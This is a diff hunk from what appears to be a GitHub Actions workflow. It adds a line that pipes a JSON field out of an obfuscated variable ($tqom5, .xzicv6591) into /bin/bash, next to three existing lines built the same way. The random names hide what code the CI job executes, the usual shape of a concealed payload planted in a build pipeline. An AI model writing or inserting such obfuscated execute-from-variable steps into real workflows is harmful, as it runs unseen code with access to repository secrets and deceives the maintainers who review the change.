@@ -27,6 +27,7 @@ jobs:
           echo $f944 | jq -r .tol65 | /bin/bash
           printf '%s' "$o25" | jq -r .wyyon4 | /bin/bash
           echo $xchs94756 | jq -r .a92 | /bin/bash
+          printf '%s' "$tqom5" | jq -r .xzicv6591 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
